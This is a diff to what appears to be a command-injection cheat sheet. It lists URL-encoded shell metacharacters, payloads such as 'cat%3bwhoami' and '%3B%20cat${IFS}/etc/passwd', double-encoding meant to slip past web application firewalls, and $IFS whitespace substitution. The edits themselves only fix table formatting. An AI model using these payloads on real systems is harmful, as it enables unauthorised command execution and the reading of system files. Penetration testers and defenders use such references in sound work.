@@ -96,7 +96,7 @@ Host: target.example.com
 | Special character | URL-encoded form | Purpose | Bypassed By |
 |-------------------|------------------|---------|-------------|
 | `;` (Semicolon) | `%3b` | Sequential command execution | `cat%3bwhoami` |
-| `|` (Pipe) | `%7c` | Inter-process data redirection | `cat%7cwhoami` |
+| (Pipe) | `%7c` | Inter-process data redirection | `cat%7cwhoami` |
 | `\n` (Newline) | `%0a` | Logical separator operating like a semicolon | `cat%0awhoami` |
 | `&` (Ampersand) | `%26` | Conditional execution | `cat%26whoami` |
 | `` ` `` (Backtick) | `%60` | Command substitution | `` `whoami` `` |
@@ -106,7 +106,7 @@ Host: target.example.com
 | URL (single) | %3B %7C %0a | ; | yes | standard evasion |
 | Double | %253B %257C %250A | ; | yes | evades WAF decoders |
 | URL + Bash variable | %3B%20cat${IFS}/etc/passwd | ; cat /etc/passwd | yes | evades whitespace rules |
-| Mixed encoding | %3B%257C%0A | ;| | yes | evades WAF logic | 
+| Mixed encoding | %3B%257C%0A | ; | yes | evades WAF logic | 
 
 - Whitespace Substitution: In Bash and sh, $IFS is an environmental variable defining the exact characters used as field boundaries. By default, its value contains a space, a tab, and a newline ( \t\n).
 
